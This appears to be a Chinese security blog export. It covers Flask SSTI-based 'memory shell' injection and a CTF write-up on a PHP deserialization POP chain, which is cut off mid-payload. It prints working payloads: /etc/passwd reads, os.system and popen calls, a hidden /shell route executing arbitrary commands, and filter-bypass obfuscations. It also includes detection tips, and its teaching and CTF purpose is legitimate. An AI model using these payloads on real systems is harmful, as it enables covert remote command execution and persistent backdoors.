<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;file&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;open&#x27;</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__dict__</span>.<span class="variable">__getitem__</span>(<span class="string">&#x27;eval&#x27;</span>)(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;ls&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
<p># import 其他模块</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line"><span class="variable">__builtins__</span>.<span class="variable">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).<span class="built_in">call</span>([<span class="string">&#x27;id&#x27;</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<img src="http://img.npfs06.top/20210930001545.png" style="zoom:80%;">

<p>关于import还有其他一些有意思的操作，包括reload方法、设置sys.modules[‘os’]、execfile等。</p>
<p><strong>回到正题，Flask 内置了两个函数 <code>url_for</code> 和 <code>get_flashed_messages</code>。也就是构造命令执行可以使用：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template_string</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    template = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;center-content error&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;%s&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> %(request.values.get(<span class="string">&#x27;param&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<img src="http://img.npfs06.top/20210929235842.png" style="zoom:80%;">



<p>将 payload 拆解开：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](</span><br><span class="line">	<span class="string">&quot;app.add_url_rule(</span></span><br><span class="line"><span class="string">		&#x27;/shell&#x27;, </span></span><br><span class="line"><span class="string">		&#x27;shell&#x27;, </span></span><br><span class="line"><span class="string">		lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span></span><br><span class="line"><span class="string">		)</span></span><br><span class="line"><span class="string">	&quot;</span>,</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],</span><br><span class="line">		<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]</span><br><span class="line">	&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="payload-解析"><a href="#payload-解析" class="headerlink" title="payload 解析"></a>payload 解析</h3><p><code> url_for.globals[&#39;builtins&#39;][&#39;eval&#39;]</code></p>
<p>这个是Flask SSTI中的payload。</p>
<p>url_for()是Flask的一个内置函数：</p>
<img src="http://img.npfs06.top/20210930084309.png" style="zoom:80%;">

<p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p>
<img src="http://img.npfs06.top/20210930084409.png" style="zoom:80%;">

<p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p>
<p><img src="/2021/09/30/%E6%B5%85%E6%9E%90php-python%E5%86%85%E5%AD%98%E9%A9%AC/Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20210930084519831.png" alt="image-20210930084519831"></p>
<p><strong>app.add_url_rule()函数</strong></p>
<p>在Flask中注册路由的时候是添加的[<code>@app.route</code>装饰器来实现的。</p>
<p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p>
<img src="http://img.npfs06.top/20210930084757.png" style="zoom:80%;">

<p>add_url_rule()函数定义：</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">add<span class="constructor">_url_rule(<span class="params">rule</span>, <span class="params">endpoint</span>=None, <span class="params">view_func</span>=None, <span class="params">provide_automatic_options</span>=None, <span class="operator">**</span><span class="params">options</span>)</span></span><br></pre></td></tr></table></figure>
<p>参数说明：</p>
<ul>
<li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li>
<li>endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值；</li>
<li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）；</li>
<li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；</li>
<li>options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项；</li>
</ul>
<p>由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。</p>
<p><strong>lambda 即匿名函数</strong>，payload 中 <code>add_url_rule()</code> 函数的第三个参数定义了一个 lambda 匿名函数，其中通过 os 库的 popen() 函数执行从 Web 请求中获取的 <code>cmd</code> 参数值并返回结果，其中该参数值默认为 <code>whoami</code>。</p>
<p><strong>_request_ctx_stack</strong>是Flask的一个全局变量，是一个LocalStack实例。</p>
<p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p>
<p>eval() 方法的语法：</p>
<p> <code>eval(expression[, globals[, locals]]) </code> </p>
<p>globals - 变量作用域，全局命名空间，如果被提供，则必须是一个字典对象。指定全局变量。</p>
<img src="http://img.npfs06.top/20210929235746.png" style="zoom:80%;">



<p>使用ssti打payload后访问<code>/shell?cmd=</code>即可执行命令</p>
<img src="http://img.npfs06.top/20210930000504.png" style="zoom:80%;">

<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>在实际操作的过程中，经常会发现某些函数或者符号被过滤了，这个时候就需要一些绕过的技巧,这有助于我们进一步的开展攻击</p>
<ul>
<li><code>url_for</code> 可用 <code>get_flashed_messages</code> 或 <code>request.application.__self__._get_data_for_json</code> 等替换；</li>
<li>代码执行函数替换，如 exec 等替换 eval；</li>
<li>字符串可采用拼接方式，如 <code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code> 变为 <code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</li>
<li><code>__globals__</code> 可用 <code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code> 替换；</li>
<li><code>[]</code>中括号可用 <code>.__getitem__()</code> 或 <code>.pop()</code> 替换；</li>
<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>，可以使用<code>&#123;%`绕过，`&#123;%%&#125;</code>中间可以执行if语句，利用这一点可以进行类似盲注的操作或者外带代码执行结果</li>
<li>过滤<code>_</code>，可以用编码绕过， 比如：<code>__class__ =&gt; \x5f\x5fclass\x5f\x5f</code></li>
<li>过滤了<code>_</code>，还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者 <code>request[&#39;values&#39;]</code>绕过</li>
<li>过滤了<code>.</code> 我们可以采用<code>attr()</code>或<code>[]</code>绕过</li>
<li>……</li>
</ul>
<p>payload example:</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">request.application.<span class="variable">__self__</span>.<span class="variable">_get_data_for_json</span>.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;__bui&#x27;</span>+<span class="string">&#x27;ltins__&#x27;</span>).<span class="variable">__getitem__</span>(<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ec&#x27;</span>)(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;calc&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ct&#x27;</span>+<span class="string">&#x27;x_stack&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;_request_&#x27;</span>+<span class="string">&#x27;ctx_stack&#x27;</span>),<span class="string">&#x27;app&#x27;</span>:get_flashed_messages.<span class="variable">__getattribute__</span>(<span class="string">&#x27;__globa&#x27;</span>+<span class="string">&#x27;ls__&#x27;</span>).pop(<span class="string">&#x27;curre&#x27;</span>+<span class="string">&#x27;nt_app&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure>


<p>flask 还有一个有趣的特性就是</p>
<p><strong>Flask在渲染模板的时候，有</strong></p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__class__&quot;</span>]</span><br></pre></td></tr></table></figure>
<p>这一特性，把上下文变成了[]中的字符串，这个特性经常会被用来绕过点号的过滤。<br>由于里面的内容已经是字符串了，还可以做一个这样的变形</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="number">__</span><span class="keyword">class</span><span class="number">__</span>===<span class="string">&quot;&quot;</span>[<span class="string">&quot;__cla&quot;</span>+<span class="string">&quot;ss__&quot;</span>]</span><br></pre></td></tr></table></figure>


<p><strong>python的格式化字符串特性</strong></p>
<p>因为python的字符串格式化允许指定ascii码为字符<br>如果放到flask里，就可以改写成<br><code>&quot;&#123;0:c&#125;&quot;[&#39;format&#39;](97)</code></p>
<img src="http://img.npfs06.top/20210930003251.png" style="zoom:80%;">

<p>那么<code>__class__</code>就可以变成</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;&#123;<span class="name">&quot;&quot;</span>[&#x27;&#123;0:c&#125;&#x27;[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">99</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">108</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">97</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">115</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)%<span class="number">2</span>b<span class="string">&#x27;&#123;0:c&#125;&#x27;</span>[&#x27;format&#x27;](<span class="name">95</span>)]&#125;&#125;</span></span><br></pre></td></tr></table></figure>


<p><strong>数字被过滤</strong></p>
<p>当我们使用attr的时候，需要用的数字，那么如果数字被过滤了，我们可以使用这些特殊的数字来绕过</p>
<img src="http://img.npfs06.top/20210930083133.png" style="zoom:80%;">





<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><ul>
<li>查看所有内建模块中是否包含 eval、exec 等可以执行代码的函数如：class <code>warnings.catch_warnings</code>、class <code>site.Quitter</code>等。</li>
<li>检测 <code>self.add_url_rule()</code> 中特殊名字的路由如 shell 等。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.kitsch.live/2021/05/17/webshell%E2%91%A3python%E5%92%8Cphp%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.kitsch.live/2021/05/17/webshell%E2%91%A3python%E5%92%8Cphp%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<p><a href="https://www.geekby.site/2021/09/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/">https://www.geekby.site/2021/09/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</a></p>
<p><a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p>
<p><a href="https://github.com/iceyhexman/flask_memory_shell">https://github.com/iceyhexman/flask_memory_shell</a></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
  </entry>
  <entry>
    <title>浙江省省赛两道反序列化题wp</title>
    <url>/2021/11/01/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B%E4%B8%A4%E9%81%93%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98wp/</url>
    <content><![CDATA[<p>前两天参加了浙江省省赛，从预赛到决赛总共考到了两题反序列化，赛后复现学到了一些新知识，这里做下记录<a id="more"></a></p>
<p>反序列化的基础知识，之前已经在博客做过总结</p>
<p><a href="https://npfs06.top/2020/04/24/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">php反序列化</a></p>
<h1 id="常用魔法函数"><a href="#常用魔法函数" class="headerlink" title="常用魔法函数"></a>常用魔法函数</h1><table>
<thead>
<tr>
<th>常用魔法函数</th>
<th>定义</th>
</tr>
</thead>
<tbody><tr>
<td>__construct()</td>
<td>在创建对象时候初始化对象，一般用于对变量赋初值。创建一个新的类时，自动调用该方法</td>
</tr>
<tr>
<td>__destruct()</td>
<td>和构造函数相反，当对象所在函数调用完毕后执行.即当一个类被销毁时自动调用该方法</td>
</tr>
<tr>
<td>__toString()</td>
<td>当对象被当做一个字符串使用时调用。</td>
</tr>
<tr>
<td>__sleep()</td>
<td>当调用<code>serialize()</code>函数时，PHP 将试图在序列动作之前调用该对象的成员函数 __sleep()。这就允许对象在被序列化之前做任何清除操作</td>
</tr>
<tr>
<td>__wakeup()</td>
<td>反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</td>
</tr>
<tr>
<td>__invoke()</td>
<td>把一个实例对象当作函数使用时自动调用</td>
</tr>
<tr>
<td>__call()</td>
<td>当调用对象中不存在的方法会自动调用该方法。</td>
</tr>
<tr>
<td>__get()</td>
<td>在调用私有属性的时候会自动执行</td>
</tr>
<tr>
<td>__isset()</td>
<td>在不可访问的属性上调用isset()或empty()触发</td>
</tr>
<tr>
<td>__unset()</td>
<td>在不可访问的属性上使用unset()时触发</td>
</tr>
</tbody></table>
<h1 id="第一道反序列化"><a href="#第一道反序列化" class="headerlink" title="第一道反序列化"></a>第一道反序列化</h1><p>搭了环境，感兴趣的师傅可以复现下，复现地址： <a href="http://www.npfs06.top:32789/">http://www.npfs06.top:32789/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A1</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Enjoy Hacking!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tmp1-&gt;hacking();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hacking</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacked By Bi0x&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A3</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hacking</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tmp2-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A4</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>=<span class="string">&#x27;1919810&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;flag&#123;&quot;</span>.<span class="keyword">$this</span>-&gt;tmp1.<span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A5</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$f</span>=<span class="keyword">$this</span>-&gt;tmp1;</span><br><span class="line">        <span class="variable">$f</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A6</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tmp1-&gt;hack4fun();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;114514&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A7</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>=<span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;114514&quot;</span>.<span class="keyword">$this</span>-&gt;tmp2.<span class="keyword">$this</span>-&gt;tmp1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A8</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tmp2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hack4fun</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Last step,Ganbadie~&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DAS&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tmp1=<span class="variable">$_GET</span>[<span class="string">&#x27;DAS&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tmp2=<span class="variable">$_GET</span>[<span class="string">&#x27;CTF&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;tmp1(<span class="keyword">$this</span>-&gt;tmp2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;DASCTF&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;DASCTF&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过代码审计，选择A1类作为pop链的嵌入点</p>
<img src="http://img.npfs06.top/20211031195236.png" style="zoom:80%;">

<p>A8类作为pop链最终要调用的地方，A8类这里有一个</p>
<blockquote>
<p>echo new $this-&gt;tmp1($this-&gt;tmp2);</p>
</blockquote>
<p>存在可控类，想到可以利用php原生类进行路径和文件的读取</p>
<img src="http://img.npfs06.top/20211031195219.png" style="zoom:80%;">

<p>需要考虑的就是如何从A1类成功调用A8类，方法有两中，如下</p>
<h2 id="pop1"><a href="#pop1" class="headerlink" title="pop1"></a>pop1</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A1();</span><br><span class="line"><span class="variable">$b</span>= <span class="variable">$a</span> -&gt;tmp1= <span class="keyword">new</span> A3();</span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$b</span>-&gt;tmp2=<span class="keyword">new</span> A5();</span><br><span class="line"><span class="variable">$d</span> =<span class="variable">$c</span>-&gt;tmp1=<span class="keyword">new</span> A7();</span><br><span class="line"><span class="variable">$e</span> =<span class="variable">$d</span>-&gt;tmp2=<span class="keyword">new</span> A6();</span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$e</span>-&gt;tmp1=<span class="keyword">new</span> A8();</span><br></pre></td></tr></table></figure>
<p>首先是A1类</p>
<img src="http://img.npfs06.top/20211031200159.png" style="zoom:80%;">

<blockquote>
<p>__wakeup:反序列化恢复对象之前调用该方法.当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</p>
</blockquote>
<p>我们令<code>$this -&gt; tmp1 = new A3()</code>, 这样在反序列化过程中触发__wakeup方法，从而调用了A3类的hacking方法，我们看到A3类</p>
<img src="http://img.npfs06.top/20211031200243.png" style="zoom:80%;">



<p>令<code>A3-&gt; tmp2 = new A5()</code> ，通过调用hacking方法，会跳转到A5的get_flag()方法，我们看到A5类</p>
<img src="http://img.npfs06.top/20211031200714.png" style="zoom:80%;">

<blockquote>
<p><strong>__call: 当调用对象中不存在的方法会自动调用该方法。</strong></p>
</blockquote>
<p>因为A5类中不存在get_flag()方法，因此会触发<code>__call()</code>方法，我们令<code>$this-&gt;tmp1 = new A7()</code></p>
<p>那么接下去的<code>$f()</code>就是将实例对象A7作为函数调用，</p>
<p>我们看到类A7</p>
<img src="http://img.npfs06.top/20211031212848.png" style="zoom:80%;">



<blockquote>
<p><strong>__invoke() :把一个实例对象当作函数使用时自动调用</strong></p>
</blockquote>
<p>因为在A5中A7被当作函数调用，因此会触发类A7的__invoke方法，我们令<code>$this-&gt;tmp2= new A6()</code> </p>
<p>来到类A6（）</p>
<img src="http://img.npfs06.top/20211031213109.png" style="zoom:80%;">

<blockquote>
<p><strong>__toString: 当对象被当做一个字符串使用时调用</strong></p>
</blockquote>
<p>A7的<code>echo &quot;114514&quot;.$this-&gt;tmp2.$this-&gt;tmp1;</code>将A6当作字符串使用了，因此会调用A6的__toString方法，我们令<code>$this-&gt;tmp1 = new A8()</code></p>
<img src="http://img.npfs06.top/20211031213333.png" style="zoom:80%;">



<p>成功调用了A8的hack4fun方法</p>
<p>序列化传参之后成功到达最后一步</p>
<figure class="highlight mathematica"><table><tr><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">DASCTF</span><span class="operator">=</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A1&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A3&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp2&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="string">&quot;A5&quot;</span><span class="operator">:</span><span class="number">2</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;tmp1&quot;</span><span class="operator">;</span><span 